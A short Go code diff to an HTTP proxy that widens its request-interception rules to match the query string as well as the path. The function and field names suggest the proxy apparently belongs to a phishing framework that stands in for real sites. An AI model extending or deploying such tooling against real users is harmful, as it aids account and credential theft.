@@ -1264,7 +1264,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if pl != nil {
 					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
 						for _, ic := range pl.intercept {
-							if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
+							// Build full path including query string for matching
+							full_path := req.URL.Path
+							if req.URL.RawQuery != "" {
+								full_path = req.URL.Path + "?" + req.URL.RawQuery
+							}
+							if ic.domain == r_host && ic.path.MatchString(full_path) {
 								if ic.method != "" && !strings.EqualFold(ic.method, req.Method) {
 									continue
 								}
